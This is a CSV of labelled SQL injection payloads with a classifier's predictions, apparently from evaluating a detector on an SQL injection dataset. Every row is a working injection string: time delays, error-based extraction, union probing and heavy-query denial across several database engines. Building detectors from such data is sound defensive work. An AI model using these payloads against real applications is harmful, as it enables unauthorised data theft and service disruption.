text,source,fuzzy_cluster_id,true_label,pred_label,prob_sqli,correct
"1'  )   as wpom where 2620  =  2620 and elt  (  3114  =  3114,sleep  (  5   )    )   #",sajid576/sql-injection-dataset,640,1,1,0.9999933242797852,1
"-2110' or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",sajid576/sql-injection-dataset,292,1,1,0.9999933242797852,1
1'+  (  select iutk where 6158  =  6158,sajid576/sql-injection-dataset,650,1,1,0.999993085861206,1
"-7248'  )   where 4626  =  4626 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",sajid576/sql-injection-dataset,292,1,1,0.9999933242797852,1
select   (  case when   (  2716  =  8138  )   then 2716 else 2716*  (  select 2716 from mysql.db  )   end  )  #,sajid576/sql-injection-dataset,659,1,1,0.999993085861206,1
"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",sajid576/sql-injection-dataset,661,1,1,0.9999932050704956,1
1'   )    )     )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  'mfmk'  =  'mfmk,sajid576/sql-injection-dataset,283,1,1,0.9999932050704956,1
1   )    )    as quap where 7625  =  7625,sajid576/sql-injection-dataset,671,1,1,0.9999932050704956,1
"-1588%""   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",sajid576/sql-injection-dataset,292,1,1,0.9999933242797852,1
"1',  (  case when 5204  =  2136 then 1 else null end  )",sajid576/sql-injection-dataset,678,1,1,0.9999932050704956,1
"1""   )    )     )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (     (  ""zgoy"" like ""zgoy",sajid576/sql-injection-dataset,229,1,1,0.9999932050704956,1
-5982' or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and 'ikuh'  =  'ikuh,sajid576/sql-injection-dataset,263,1,1,0.9999932050704956,1
-7209'   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  'stqx'  =  'stqx,sajid576/sql-injection-dataset,263,1,1,0.9999932050704956,1
"1"" waitfor delay '0:0:5' and ""dvfr"" like ""dvfr",sajid576/sql-injection-dataset,689,1,1,0.9999892711639404,1
"-6170   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",sajid576/sql-injection-dataset,292,1,1,0.9999932050704956,1
"-5903%""   )    )     )   or 3038  =  3038",sajid576/sql-injection-dataset,698,1,1,0.9999932050704956,1
"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )",sajid576/sql-injection-dataset,229,1,1,0.999993085861206,1
1' waitfor delay '0:0:5'--,sajid576/sql-injection-dataset,114,1,1,0.9999920129776001,1
-2100' where 9260  =  9260 or 3038  =  3038,sajid576/sql-injection-dataset,709,1,1,0.999993085861206,1
1'   )    )    and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   'guxv'  =  'guxv,sajid576/sql-injection-dataset,263,1,1,0.9999932050704956,1
-5967 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  # lhoh,sajid576/sql-injection-dataset,263,1,1,0.9999932050704956,1
1'  )   where 9272  =  9272,sajid576/sql-injection-dataset,719,1,1,0.999993085861206,1
1'   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   'cqwz' like 'cqwz,sajid576/sql-injection-dataset,229,1,1,0.9999932050704956,1
"1""   )    )    as isqj where 6344  =  6344 union all select null,null,null,null--",sajid576/sql-injection-dataset,729,1,1,0.999993085861206,1
"1%' or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and '%'  =  '",sajid576/sql-injection-dataset,311,1,1,0.9999932050704956,1
"-6523"" or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and ""bwrb"" like ""bwrb",sajid576/sql-injection-dataset,283,1,1,0.9999932050704956,1
"-7313""  )   where 3606  =  3606 union all select 3606#",sajid576/sql-injection-dataset,741,1,1,0.9999932050704956,1
"-4558' or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",sajid576/sql-injection-dataset,292,1,1,0.9999933242797852,1
1 where 8921  =  8921 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,sajid576/sql-injection-dataset,750,1,1,0.9999932050704956,1
"1'  )   as ycsr where 2238  =  2238 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",sajid576/sql-injection-dataset,757,1,1,0.9999933242797852,1
1' where 6116  =  6116,sajid576/sql-injection-dataset,761,1,1,0.999993085861206,1
"1%"" and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and ""%""  =  """,sajid576/sql-injection-dataset,263,1,1,0.9999932050704956,1
"-3885  )   where 2387  =  2387 union all select 2387,2387,2387,2387,2387,2387,2387#",sajid576/sql-injection-dataset,771,1,1,0.9999932050704956,1
"-5524  )   as eoyk where 6928  =  6928 union all select 6928,6928,6928,6928,6928,6928,6928,6928,6928--",sajid576/sql-injection-dataset,781,1,1,0.9999932050704956,1
"1"" where 1166  =  1166",sajid576/sql-injection-dataset,786,1,1,0.9999929666519165,1
"1%"" and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and ""%""  =  """,sajid576/sql-injection-dataset,311,1,1,0.9999932050704956,1
"-9057""  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",sajid576/sql-injection-dataset,292,1,1,0.9999933242797852,1
"1',  (  select   (  case when   (  1392  =  1380  )   then 1 else 1392*  (  select 1392 from master..sysdatabases  )   end   )    )",sajid576/sql-injection-dataset,790,1,1,0.9999932050704956,1
"1'  )   and elt  (  4249  =  4249,7259  )   and   (  'bkag'  =  'bkag",sajid576/sql-injection-dataset,802,1,1,0.9999933242797852,1
"1'  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  'ndhn' like 'ndhn",sajid576/sql-injection-dataset,311,1,1,0.9999932050704956,1
1'||  (  select 'vuku' where 3143  =  3143 waitfor delay '0:0:5'--,sajid576/sql-injection-dataset,816,1,1,0.9999932050704956,1
-7103   )    )    or 4610  =  1871 and    (    (   1249  =  1249,sajid576/sql-injection-dataset,824,1,1,0.999993085861206,1
"-4347' union all select 6074,6074,6074,6074,6074,6074,6074--",sajid576/sql-injection-dataset,840,1,1,0.999992847442627,1
"(  select * from generate_series  (  4990,4990,case when   (  4990  =  5065  )   then 1 else 0 end  )   limit 1  )",sajid576/sql-injection-dataset,848,1,1,0.999993085861206,1
"-3501'   )    )     )   or make_set  (  7122  =  6158,6158  )   and    (    (     (  'mlfl' like 'mlfl",sajid576/sql-injection-dataset,850,1,1,0.9999932050704956,1
"1""   )    )    as rfgu where 4880  =  4880 union all select null,null,null,null,null,null,null,null,null--",sajid576/sql-injection-dataset,857,1,1,0.9999932050704956,1
"1"" or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and ""uqor"" like ""uqor",sajid576/sql-injection-dataset,311,1,1,0.9999932050704956,1
"-5379'  )   union all select 4294,4294,4294--",sajid576/sql-injection-dataset,874,1,1,0.9999932050704956,1
"1'  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  'fnjm'  =  'fnjm",sajid576/sql-injection-dataset,311,1,1,0.9999932050704956,1
1 where 7224  =  7224 and sleep  (  5  )  #,sajid576/sql-injection-dataset,884,1,1,0.999993085861206,1
1  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ),sajid576/sql-injection-dataset,263,1,1,0.9999932050704956,1
1  )   where 2734  =  2734 waitfor delay '0:0:5'--,sajid576/sql-injection-dataset,897,1,1,0.999993085861206,1
1   )    )    as msug where 3503  =  3503 and sleep  (  5  )  #,sajid576/sql-injection-dataset,907,1,1,0.9999932050704956,1
"-3884"" where 8012  =  8012 union all select 8012,8012#",sajid576/sql-injection-dataset,917,1,1,0.999993085861206,1
1' in boolean mode  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   #,sajid576/sql-injection-dataset,922,1,1,0.999993085861206,1
1' where 2389  =  2389 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,sajid576/sql-injection-dataset,263,1,1,0.9999932050704956,1
"1'   )    )    as uuuk where 7234  =  7234 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",sajid576/sql-injection-dataset,930,1,1,0.9999933242797852,1
1%'   )    )     )   and 2006  =  2006,sajid576/sql-injection-dataset,499,1,1,0.999993085861206,1
"-3756'  )   union all select 1034,1034,1034--",sajid576/sql-injection-dataset,942,1,1,0.9999932050704956,1
"1""   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  ""twpn"" like ""twpn",sajid576/sql-injection-dataset,311,1,1,0.9999932050704956,1
1'   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  'gegg'  =  'gegg,sajid576/sql-injection-dataset,263,1,1,0.999993085861206,1
"1'  )   as kgnd where 1550  =  1550 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",sajid576/sql-injection-dataset,952,1,1,0.9999933242797852,1
"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""kojr""  =  ""kojr",sajid576/sql-injection-dataset,229,1,1,0.9999932050704956,1
"-7860'   )    )     )   union all select 7420,7420,7420,7420,7420,7420,7420,7420,7420,7420--",sajid576/sql-injection-dataset,966,1,1,0.9999932050704956,1
-8057'   )    )    as gpue where 4205  =  4205 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,sajid576/sql-injection-dataset,263,1,1,0.9999933242797852,1
"-1390%""   )    )    union all select 8930,8930,8930,8930,8930#",sajid576/sql-injection-dataset,981,1,1,0.999993085861206,1
-6122'   )    )     )   or 9243  =  6161--,sajid576/sql-injection-dataset,989,1,1,0.999993085861206,1
1'+  (  select 'mxlb' where 4900  =  4900,sajid576/sql-injection-dataset,992,1,1,0.999993085861206,1
-4248 where 3288  =  3288 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,sajid576/sql-injection-dataset,283,1,1,0.9999932050704956,1
"1""   )    )     )   waitfor delay '0:0:5'--",sajid576/sql-injection-dataset,114,1,1,0.9999929666519165,1
1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  'fuvv'  =  'fuvv,sajid576/sql-injection-dataset,229,1,1,0.9999932050704956,1
"iif  (  1539  =  1539,1539,1/0  )",sajid576/sql-injection-dataset,1006,1,1,0.999993085861206,1
"(  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6130  =  6130,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )",sajid576/sql-injection-dataset,311,1,1,0.999993085861206,1
-2050' union all select 5606#,sajid576/sql-injection-dataset,1018,1,1,0.9999927282333374,1
-7199' or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and 'qibr'  =  'qibr,sajid576/sql-injection-dataset,283,1,1,0.9999932050704956,1
"1""   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   ""rqxd""  =  ""rqxd",sajid576/sql-injection-dataset,311,1,1,0.9999932050704956,1
1   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   5139  =  5139,sajid576/sql-injection-dataset,283,1,1,0.9999932050704956,1
-9644   )    )    or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   5616  =  5616,sajid576/sql-injection-dataset,283,1,1,0.9999932050704956,1
"1'||  (  select 'zifu' from dual where 4822  =  4822 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sajid576/sql-injection-dataset,1031,1,1,0.9999933242797852,1
